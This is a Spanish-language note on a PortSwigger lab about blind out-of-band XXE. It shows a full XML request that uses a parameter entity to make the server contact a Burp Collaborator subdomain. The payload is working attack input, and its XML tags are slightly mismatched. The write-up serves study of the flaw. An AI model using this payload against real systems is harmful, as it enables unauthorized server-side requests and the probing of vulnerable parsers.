# XXE ciego con entidades XML externas (OOB)

Tags: #XXE #PortSwigger #XML 

```bash 
En este lab se continua con la explotación de vulnerabilidades XXE ciegas, utilizando una variante más sofisticada. En este caso, la aplicación bloquea las entidades externas tradicionales, lo que nos obliga a recurrir al uso de parameter entities, una técnica menos común pero igualmente poderosa.

El objetivo es forzar al analizador XML a realizar una solicitud externa, y para ello empleamos Burp Collaborator como canal para observar si el servidor realiza conexiones salientes. Si vemos actividad en Collaborator después de enviar nuestra carga, confirmamos la vulnerabilidad.
```

```xml 
<!-- Petición modificada colocando una entidad de parámetro -->

<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>      
	<stockCehck>
		<productId>
			1
		</productId>
		<storedID>
			1
		</storedId>
	</stockCheck>


Notas:
	1. A las entidades de parámetro se le coloca un '%' y se expande la entidad 
```

